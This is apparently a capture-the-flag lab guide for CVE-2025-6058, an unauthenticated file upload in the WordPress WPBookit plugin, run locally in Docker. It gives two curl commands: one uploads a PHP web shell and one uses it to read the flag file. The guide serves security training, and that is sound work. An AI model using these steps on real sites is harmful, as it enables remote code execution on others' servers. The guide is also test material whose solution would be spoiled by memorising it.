# WEB-04: WordPress WPBookit RCE

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-04 |
| 名称 | WordPress WPBookit RCE |
| 技术/CVE | CVE-2025-6058 |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10104 |

## 场景概述
- 技术：CVE-2025-6058
- 难度：L1
- 交付方式：docker
- 入口端口：10104
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-6058 (CVSS 9.8) |
| Difficulty | L1 |
| Port | 10104 |
| Plugin | wpbookit 1.0.4 |

### Attack Path
```
Unauthenticated POST to image_upload_handle() → PHP file upload → RCE → /flag.txt
```

### Step-by-Step

```bash
# Exploit image_upload_handle() unauthenticated upload
curl -X POST "http://localhost:10104/wp-admin/admin-ajax.php?action=image_upload_handle" \
  -F "file=@exploit.php"

# Access webshell
curl "http://localhost:10104/wp-content/uploads/wpbookit/exploit.php?cmd=cat%20/flag.txt"
# flag{web-04-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | WordPress and WPBookit upload workflow |
| 侦察与前置条件 | Locate image_upload_handle() and its unauthenticated request shape |
| 核心漏洞与利用 | Abuse unrestricted file upload with a PHP payload |
| 权限、横向或影响 | PHP web-shell execution |
| 验证 | Invoke the uploaded shell and validate the returned flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
